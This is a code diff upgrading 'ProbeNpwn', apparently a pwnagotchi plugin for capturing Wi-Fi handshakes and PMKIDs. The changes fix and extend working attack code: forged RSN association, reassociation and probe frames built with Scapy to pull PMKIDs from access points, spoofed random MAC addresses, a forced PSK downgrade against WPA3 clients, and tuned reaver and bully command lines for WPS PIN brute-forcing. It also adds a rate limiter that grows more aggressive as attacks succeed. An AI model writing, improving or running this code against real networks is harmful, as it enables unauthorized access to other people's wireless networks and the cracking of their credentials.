@@ -1,16 +1,22 @@
 """
-ProbeNpwn v3.3.0 – Ultimate handshake/PMKID capture plugin
+ProbeNpwn v3.4.0 – Ultimate handshake/PMKID capture plugin
 Author: AlienMajik
 License: GPL3
 
-New in 3.3.0:
-- Added quiet association attacks: PMKID association, auth frame harvest,
-  reassociation PMKID, RSN probe, CSA probe (no deauth needed).
-- WPS attack now captures PIN from bully/reaver and saves to /root/handshakespin/.
-- New config options: enable_pmkid_attack, enable_auth_harvest,
-  enable_reassociation, enable_rsn_probe, pin_save_path.
-- Improved process handling for external tools with output parsing.
-- Now respects pwnagotchi personality settings for deauth and associate.
+New in 3.4.0 (fixes + enhancements over 3.3.0):
+- Fixed broken Dot11EltRSN construction (invalid kwargs) → reliable raw-bytes RSN IE helper.
+- Fixed inverted retry-queue priority (negative timestamps on min-heap).
+- Fixed AdaptiveTokenBucket always reporting ~100% success (now tracks attempts + successes).
+- Fixed locally-administered MAC generation (could produce multicast addresses).
+- Improved WPS (bully/reaver) command lines: now include channel, ESSID, better flags.
+- More robust blacklist/cooldown TTL handling.
+- Cleaner quiet-association path and defensive packet sending.
+- Still fully compatible with jayofelony 2.9.5.4 – 2.9.5.8 (and current Trixie images).
+
+Previous (3.3.0):
+- Quiet association attacks (PMKID assoc, auth harvest, reassoc, RSN probe).
+- WPS PIN capture + save to /root/handshakespin/.
+- Personality respect for deauth/associate, adaptive rate limiting, state persistence, etc.
 """
 
 import logging
@@ -197,16 +203,21 @@ class AdaptiveTokenBucket(TokenBucket):
         self.attempts = 0
         self.successes = 0
 
-    def update_stats(self, success: bool):
+    def record_attempt(self, success: bool = False):
+        """Record an attack attempt (and optional success). Recalculates rate every 10 attempts."""
         self.attempts += 1
         if success:
             self.successes += 1
         if self.attempts >= 10:
-            self.success_ratio = self.successes / self.attempts
-            # Adjust rate: more success → more tokens
-            self.rate = self.base_rate * (0.5 + self.success_ratio)
+            self.success_ratio = self.successes / max(1, self.attempts)
+            # Higher success → more aggressive (higher refill rate)
+            self.rate = max(0.05, self.base_rate * (0.35 + 1.3 * self.success_ratio))
             self.attempts = 0
-            self.successes = 0
+            self.successes = max(0, self.successes // 2)  # partial decay instead of full reset
+
+    # Keep old name for backward compatibility inside the plugin
+    def update_stats(self, success: bool):
+        self.record_attempt(success=success)
 
 
 # ----------------------------------------------------------------------
@@ -214,14 +225,14 @@ class AdaptiveTokenBucket(TokenBucket):
 # ----------------------------------------------------------------------
 class ProbeNpwn(plugins.Plugin):
     __author__ = 'AlienMajik'
-    __version__ = '3.3.0'
+    __version__ = '3.4.0'
     __license__ = 'GPL3'
-    __description__ = 'Ultimate handshake/PMKID capture – with quiet association attacks and WPS PIN saving.'
+    __description__ = 'Ultimate handshake/PMKID capture – quiet association attacks, WPS PIN saving, fixed RSN/rate-limiter/retry (v3.4.0).'
 
     def __init__(self):
         super().__init__()
         self.logger = logging.getLogger(__name__)
-        self.logger.debug("ProbeNpwn v3.3.0 initializing")
+        self.logger.debug("ProbeNpwn v3.4.0 initializing")
 
         self.config = {}
         self.agent = None
@@ -263,8 +274,10 @@ class ProbeNpwn(plugins.Plugin):
         self.channel_time_pattern = defaultdict(lambda: defaultdict(int))
 
         self.whitelist: Set[str] = set()
-        self.blacklist = TTLCache(MAX_AP_GROUPS, 3600)
-        self.cooldowns = TTLCache(MAX_AP_GROUPS, 3600)
+        # Large TTL so the cache itself does not drop entries early;
+        # actual expiry is still controlled by the stored timestamp value.
+        self.blacklist = TTLCache(MAX_AP_GROUPS, 86400 * 30)
+        self.cooldowns = TTLCache(MAX_AP_GROUPS, 86400)
 
         self.retry_queue = []
         self.retry_queue_lock = threading.Lock()
@@ -440,7 +453,8 @@ class ProbeNpwn(plugins.Plugin):
     # ------------------------------------------------------------------
     def _generate_locally_administered_mac(self) -> str:
         """Generate a random locally administered unicast MAC address."""
-        first_byte = random.randint(0x02, 0xfe) | 0x02
+        # Clear multicast bit (LSB) and set locally-administered bit (bit 1)
+        first_byte = (random.randint(0, 255) & 0xfe) | 0x02
         mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
         return ':'.join(f"{b:02x}" for b in mac).lower()
 
@@ -1375,25 +1389,31 @@ class ProbeNpwn(plugins.Plugin):
         self.frag_variants(ap, client_macs)
 
     # ------------------------------------------------------------------
+    # Reliable RSN IE builder (avoids broken Dot11EltRSN kwargs across Scapy versions)
+    # ------------------------------------------------------------------
+    def _build_rsn_ie(self, akm: int = 2, pairwise: int = 4, group: int = 4) -> "Dot11Elt":
+        """
+        Build a minimal valid RSN Information Element as raw Dot11Elt.
+        akm: 2 = PSK, 8 = SAE (WPA3)
+        pairwise/group: 4 = CCMP
+        """
+        info = struct.pack("<H", 1)                          # version
+        info += b"\x00\x0f\xac" + bytes([group])             # group cipher suite
+        info += struct.pack("<H", 1)                         # pairwise count
+        info += b"\x00\x0f\xac" + bytes([pairwise])          # pairwise cipher
+        info += struct.pack("<H", 1)                         # akm count
+        info += b"\x00\x0f\xac" + bytes([akm])               # akm suite
+        info += struct.pack("<H", 0)                         # RSN capabilities
+        return Dot11Elt(ID=48, info=info)
+
+    # ------------------------------------------------------------------
     # New Quiet Association Attacks (no deauth)
     # ------------------------------------------------------------------
     def pmkid_association_attack(self, ap: dict, ap_caps: dict = None):
         """Request PMKID directly from AP via association."""
         if not self.scapy_available or not self.enable_pmkid_attack:
             return
-        # Construct RSN IE with PMKID request (properly formatted)
-        rsn = Dot11EltRSN(
-            ID=48,
-            len=20,
-            version=1,
-            group_cipher=4,  # CCMP
-            pairwise_count=1,
-            pairwise_ciphers=4,  # CCMP
-            akm_count=1,
-            akm_suites=2,  # PSK
-            rsn_capabilities=0
-        )
-        # Use random client MAC
+        rsn = self._build_rsn_ie(akm=2, pairwise=4, group=4)  # PSK + CCMP
         src_mac = self._get_random_mac() if self.mac_randomization else "00:11:22:33:44:55"
         pkt = RadioTap() / Dot11(
             addr1=ap['mac'],
@@ -1427,13 +1447,15 @@ class ProbeNpwn(plugins.Plugin):
         if not self.scapy_available or not self.enable_reassociation:
             return
         src_mac = self._get_random_mac() if self.mac_randomization else "00:11:22:33:44:55"
+        rsn = self._build_rsn_ie(akm=2)
+        hostname = ap.get('hostname', '') or ''
         pkt = RadioTap() / Dot11(
             addr1=ap['mac'],
             addr2=src_mac,
             addr3=ap['mac']
         ) / Dot11ReassoReq(listen_interval=0) / Dot11Elt(
-            ID=0, len=len(ap.get('hostname', '')), info=ap.get('hostname', '').encode()
-        )
+            ID=0, info=hostname.encode()
+        ) / rsn
         try:
             sendp(pkt, iface=self.inject_iface, count=3, inter=0.1, verbose=0)
             self.logger.debug(f"Reassociation PMKID request to {ap['mac']}")
@@ -1444,25 +1466,15 @@ class ProbeNpwn(plugins.Plugin):
         """Probe request with RSN IE to trigger capability disclosure."""
         if not self.scapy_available or not self.enable_rsn_probe:
             return
-        # RSN IE indicating WPA3/FT support
-        rsn = Dot11EltRSN(
-            ID=48,
-            len=20,
-            version=1,
-            group_cipher=4,
-            pairwise_count=1,
-            pairwise_ciphers=4,
-            akm_count=1,
-            akm_suites=8,  # SAE (WPA3)
-            rsn_capabilities=0
-        )
+        rsn = self._build_rsn_ie(akm=8)  # SAE (WPA3)
         src_mac = self._get_random_mac() if self.mac_randomization else "00:11:22:33:44:55"
+        hostname = ap.get('hostname', '') or ''
         pkt = RadioTap() / Dot11(
             addr1=ap['mac'],
             addr2=src_mac,
             addr3=ap['mac']
         ) / Dot11ProbeReq() / Dot11Elt(
-            ID=0, len=len(ap.get('hostname', '')), info=ap.get('hostname', '').encode()
+            ID=0, info=hostname.encode()
         ) / rsn
         try:
             sendp(pkt, iface=self.inject_iface, count=2, inter=0.1, verbose=0)
@@ -1502,7 +1514,23 @@ class ProbeNpwn(plugins.Plugin):
             self.logger.debug(f"Too many external processes, skipping WPS on {ap['mac']}")
             return
 
-        cmd = [tool, "-b", ap['mac'], "-i", self.inject_iface]
+        channel = str(ap.get('channel', 1))
+        essid = ap.get('hostname', '') or ''
+        if tool == 'reaver':
+            cmd = [
+                tool, '-i', self.inject_iface, '-b', ap['mac'],
+                '-c', channel, '-vv', '-N', '-L'
+            ]
+            if essid:
+                cmd.extend(['-e', essid])
+        else:  # bully
+            cmd = [
+                tool, '-b', ap['mac'], '-c', channel,
+                '-i', self.inject_iface, '-S', '-v', '2'
+            ]
+            if essid:
+                cmd.extend(['-e', essid])
+
         try:
             proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                     universal_newlines=True, bufsize=1)
@@ -1573,17 +1601,7 @@ class ProbeNpwn(plugins.Plugin):
                 ap_caps = self.ap_capabilities.get(ap['mac'].lower(), {})
         if not ap_caps.get('wpa3', False):
             return
-        rsn_ie = Dot11EltRSN(
-            ID=48,
-            len=20,
-            version=1,
-            group_cipher=4,
-            pairwise_count=1,
-            pairwise_ciphers=4,
-            akm_count=1,
-            akm_suites=2,
-            rsn_capabilities=0
-        )
+        rsn_ie = self._build_rsn_ie(akm=2)  # force PSK view
         for cl_mac in client_macs[:3]:
             pkt = RadioTap() / Dot11(
                 addr1=cl_mac,
@@ -1997,6 +2015,10 @@ class ProbeNpwn(plugins.Plugin):
         if not self._rate_limit_ap(ap_mac):
             self._push_retry(agent, ap, cl, retry + 1, delay=30)
             return
+        # Record the attempt (success will be recorded later in on_handshake)
+        with self.rate_limiter_lock:
+            if ap_mac in self.rate_limiters:
+                self.rate_limiters[ap_mac].record_attempt(success=False)
         if not self.ok_to_attack(agent, ap):
             return
 
@@ -2122,20 +2144,24 @@ class ProbeNpwn(plugins.Plugin):
         self.attack_count_epoch += 1
 
     # ------------------------------------------------------------------
-    # Retry queue (efficient using negative timestamps)
+    # Retry queue (min-heap of (timestamp, counter, args) – soonest first)
     # ------------------------------------------------------------------
     def _push_retry(self, agent, ap: dict, cl: dict, retry: int, delay: float):
         with self.retry_queue_lock:
             timestamp = time.time() + delay
-            heapq.heappush(self.retry_queue, (-timestamp, retry, (agent, ap, cl, retry)))
+            # Use a monotonic counter so heap never compares the args tuple
+            counter = getattr(self, "_retry_counter", 0)
+            self._retry_counter = counter + 1
+            heapq.heappush(self.retry_queue, (timestamp, counter, (agent, ap, cl, retry)))
             if len(self.retry_queue) > MAX_RETRY_QUEUE:
+                # Drop the soonest item when over capacity (prefer newer retries)
                 heapq.heappop(self.retry_queue)
 
     def _process_retry_queue(self):
         now = time.time()
         with self.retry_queue_lock:
-            while self.retry_queue and -self.retry_queue[0][0] <= now:
-                neg_ts, retry, args = heapq.heappop(self.retry_queue)
+            while self.retry_queue and self.retry_queue[0][0] <= now:
+                _, _, args = heapq.heappop(self.retry_queue)
                 self.executor.submit(self.attack_target, *args)
 
     # ------------------------------------------------------------------
@@ -2390,4 +2416,3 @@ class ProbeNpwn(plugins.Plugin):
 # ----------------------------------------------------------------------
 def __load_plugin__():
     return ProbeNpwn()
-
